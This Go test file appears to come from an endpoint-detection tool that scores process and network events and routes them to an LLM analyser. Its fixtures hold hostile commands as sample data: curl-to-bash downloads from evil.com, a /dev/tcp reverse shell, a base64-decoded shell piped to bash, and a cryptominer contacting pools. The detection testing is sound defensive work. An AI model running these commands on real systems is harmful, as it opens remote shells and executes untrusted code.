package main

import (
	"context"
	"testing"
	"time"

	"KernelHarbor/cmd/analysis/internal/interestingness"
	"KernelHarbor/cmd/analysis/internal/llm"
)

type evalEvent struct {
	eventType   string
	commandLine string
	imagePath   string
	remoteAddr  string
	remotePort  uint16
	filePath    string
	processID   uint32
	parentGUID  string
	hostName    string
}

func (e evalEvent) GetEventType() string   { return e.eventType }
func (e evalEvent) GetCommandLine() string { return e.commandLine }
func (e evalEvent) GetImagePath() string   { return e.imagePath }
func (e evalEvent) GetRemoteAddr() string  { return e.remoteAddr }
func (e evalEvent) GetRemotePort() uint16  { return e.remotePort }
func (e evalEvent) GetFilePath() string    { return e.filePath }
func (e evalEvent) GetProcessID() uint32   { return e.processID }
func (e evalEvent) GetParentGUID() string  { return e.parentGUID }
func (e evalEvent) GetHostName() string    { return e.hostName }

type evalCase struct {
	name             string
	events           []evalEvent
	expectedScoreMin float64
	expectedScoreMax float64
	heuristicMatch   bool
}

func TestEvalPipeline_Interestingness(t *testing.T) {
	s := interestingness.New()
	known := interestingness.DefaultKnownBinaries()

	cases := []evalCase{
		{
			name: "benign-ls",
			events: []evalEvent{
				{eventType: "execve", commandLine: "ls -la", imagePath: "/bin/ls"},
			},
			expectedScoreMin: 0.0,
			expectedScoreMax: 0.1,
		},
		{
			name: "benign-git-clone",
			events: []evalEvent{
				{eventType: "execve", commandLine: "git clone https://github.com/user/repo", imagePath: "/usr/bin/git"},
				{eventType: "execve", commandLine: "ls -la", imagePath: "/bin/ls"},
			},
			expectedScoreMin: 0.0,
			expectedScoreMax: 0.1,
		},
		{
			name: "suspicious-curl-pipe",
			events: []evalEvent{
				{eventType: "execve", commandLine: "curl http://evil.com/script.sh", imagePath: "/usr/bin/curl"},
				{eventType: "execve", commandLine: "bash /tmp/script.sh", imagePath: "/bin/bash"},
				{eventType: "connect", imagePath: "/bin/bash", remoteAddr: "10.0.0.1", remotePort: 4444},
			},
			expectedScoreMin: 0.5,
			expectedScoreMax: 1.0,
			heuristicMatch:   true,
		},
		{
			name: "suspicious-base64-decode",
			events: []evalEvent{
				{eventType: "execve", commandLine: "echo YmFzaCAtaSA+JiA= | base64 -d | bash", imagePath: "/usr/bin/base64"},
			},
			expectedScoreMin: 0.0,
			expectedScoreMax: 0.2,
			heuristicMatch:   true,
		},
		{
			name: "malicious-reverse-shell",
			events: []evalEvent{
				{eventType: "execve", commandLine: "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", imagePath: "/bin/bash"},
			},
			expectedScoreMin: 0.0,
			expectedScoreMax: 0.2,
			heuristicMatch:   true,
		},
		{
			name: "malicious-crypto-miner",
			events: []evalEvent{
				{eventType: "execve", commandLine: "", imagePath: "/tmp/xmrig"},
				{eventType: "connect", imagePath: "/tmp/xmrig", remoteAddr: "pool.mine.com", remotePort: 3333},
				{eventType: "connect", imagePath: "/tmp/xmrig", remoteAddr: "pool2.mine.com", remotePort: 4444},
			},
			expectedScoreMin: 0.5,
			expectedScoreMax: 1.0,
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			likes := make([]interestingness.EventLike, len(tc.events))
			for i, e := range tc.events {
				likes[i] = e
			}

			score := s.Score(interestingness.BatchInfo{
				Events:   likes,
				HostName: "test-host",
			}, known)

			if score < tc.expectedScoreMin || score > tc.expectedScoreMax {
				t.Errorf("score = %.2f, want between %.2f and %.2f", score, tc.expectedScoreMin, tc.expectedScoreMax)
			}

			if tc.heuristicMatch {
				for _, ev := range tc.events {
					if hasSuspiciousPattern(ev.commandLine) {
						return
					}
				}
				t.Errorf("expected heuristic match but none found")
			}
		})
	}
}

func TestEvalPipeline_AlertStore(t *testing.T) {
	store := NewAlertStore()

	store.Add(Alert{
		ID:         "test-1",
		Timestamp:  time.Now(),
		HostName:   "test-host",
		Verdict:    "malicious",
		Confidence: 0.95,
		Summary:    "test alert",
		Source:     "llm",
	})
	store.Add(Alert{
		ID:         "test-2",
		Timestamp:  time.Now(),
		HostName:   "test-host",
		Verdict:    "suspicious",
		Confidence: 0.75,
		Summary:    "test alert 2",
		Source:     "heuristic",
	})

	alerts := store.List(time.Now().Add(-1*time.Hour), "suspicious", 10)
	if len(alerts) != 2 {
		t.Errorf("expected 2 alerts, got %d", len(alerts))
	}

	stats := store.Stats()
	if stats.Malicious != 1 {
		t.Errorf("expected 1 malicious, got %d", stats.Malicious)
	}
	if stats.Suspicious != 1 {
		t.Errorf("expected 1 suspicious, got %d", stats.Suspicious)
	}

	if !store.SetFeedback("test-1", "confirmed") {
		t.Error("SetFeedback returned false for existing alert")
	}
	if store.SetFeedback("nonexistent", "confirmed") {
		t.Error("SetFeedback returned true for nonexistent alert")
	}

	stats = store.Stats()
	if stats.Confirmed != 1 {
		t.Errorf("expected 1 confirmed, got %d", stats.Confirmed)
	}
}

type nullBackend struct{}

func (n *nullBackend) Analyze(req llm.AnalysisRequest) (*llm.AnalysisResult, error) {
	return &llm.AnalysisResult{
		Verdict:    "benign",
		Confidence: 0.0,
		Summary:    "null backend",
		ModelUsed:  "none",
		Timestamp:  time.Now(),
	}, nil
}
func (n *nullBackend) Name() string { return "test-null" }

func TestEvalPipeline_ProcessorGate(t *testing.T) {
	_, cancel := context.WithCancel(context.Background())
	defer cancel()

	alertStore := NewAlertStore()
	scorer := interestingness.New()

	bp := NewBatchProcessor(BatchProcessorConfig{
		Workers:      1,
		BatchSize:    10,
		BatchTimeout: 100 * time.Millisecond,
		LLMThreshold: 0.8,
	})
	bp.SetInterestingness(scorer)
	bp.SetLLMBackend(&nullBackend{})
	bp.SetAlertStore(alertStore)
	bp.Start()
	defer bp.Stop()

	bp.Submit(Event{
		EventID:     "eval-1",
		EventType:   "execve",
		CommandLine: "ls -la",
		ImagePath:   "/bin/ls",
		HostName:    "test-host",
		Timestamp:   time.Now(),
	})

	bp.Submit(Event{
		EventID:     "eval-2",
		EventType:   "execve",
		CommandLine: "curl http://evil.com/s.sh | bash",
		ImagePath:   "/usr/bin/curl",
		HostName:    "test-host",
		Timestamp:   time.Now(),
	})

	time.Sleep(300 * time.Millisecond)

	alerts := alertStore.List(time.Now().Add(-1*time.Hour), "benign", 10)
	t.Logf("Alerts generated: %d", len(alerts))
	for _, a := range alerts {
		t.Logf("  %s verdict=%s confidence=%.2f", a.ID, a.Verdict, a.Confidence)
	}
}

func TestEvalPipeline_EventBehaviorSummary(t *testing.T) {
	cases := []struct {
		name     string
		event    Event
		contains []string
	}{
		{
			name: "execve",
			event: Event{
				EventType:   "execve",
				CommandLine: "ls -la",
				ImagePath:   "/bin/ls",
				User:        "root",
			},
			contains: []string{"event_type:execve", "image:ls", "user:root"},
		},
		{
			name: "reverse-shell-detection",
			event: Event{
				EventType:   "execve",
				CommandLine: "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
				ImagePath:   "/bin/bash",
			},
			contains: []string{"event_type:execve", "reverse_shell"},
		},
		{
			name: "network-connection",
			event: Event{
				EventType:  "connect",
				RemoteAddr: "10.0.0.1",
				RemotePort: 4444,
			},
			contains: []string{"event_type:connect", "remote:"},
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			summary := tc.event.ToBehaviorSummary()
			for _, substr := range tc.contains {
				if !contains(summary, substr) {
					t.Errorf("expected summary %q to contain %q", summary, substr)
				}
			}
		})
	}
}
